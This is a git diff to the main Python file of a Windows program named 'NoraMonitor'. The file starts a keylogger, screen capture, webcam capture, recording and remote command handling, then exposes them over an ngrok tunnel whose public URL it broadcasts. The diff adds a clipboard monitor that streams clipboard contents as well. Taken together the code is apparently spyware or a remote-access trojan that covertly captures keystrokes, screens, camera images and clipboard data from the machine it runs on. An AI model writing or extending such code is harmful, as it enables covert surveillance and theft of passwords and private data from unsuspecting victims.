@@ -7,13 +7,14 @@ import screencap as sc
 import controller
 import recorder as rec
 import camera as cam
+import clipboard_monitor as cb
 
 PORT = int(os.environ.get("NORA_PORT", 9090))
 NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "")
 
-_APP_DIR = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
-_TOKEN_FILE = os.path.join(_APP_DIR, "ngrok.token")
-_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
+_APP_DIR       = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
+_TOKEN_FILE    = os.path.join(_APP_DIR, "ngrok.token")
+_RECORDINGS_DIR= os.path.join(_APP_DIR, "recordings")
 
 
 def _load_token():
@@ -33,10 +34,8 @@ def _start_ngrok(port):
         conf.get_default().auth_token = token
         tunnel = ngrok.connect(port, "http")
         url = tunnel.public_url
-        # Give the server a moment to start then broadcast URL
         def _broadcast():
-            import time
-            time.sleep(2)
+            import time; time.sleep(2)
             server.broadcast_ngrok_url(url)
         threading.Thread(target=_broadcast, daemon=True).start()
     except Exception:
@@ -45,18 +44,18 @@ def _start_ngrok(port):
 
 def main():
     recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
-    camera = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)
+    camera   = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)
 
     server.init(controller.handle_command, recorder, camera)
 
-    keylogger = kl.Keylogger(server.broadcast_key)
-    keylogger.start()
+    kl.Keylogger(server.broadcast_key).start()
 
     capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
     capture.attach_recorder(recorder)
     capture.start()
 
-    # Start ngrok tunnel if token available
+    cb.ClipboardMonitor(server.broadcast_clipboard).start()
+
     threading.Thread(target=_start_ngrok, args=(PORT,), daemon=True).start()
 
     server.run(port=PORT)
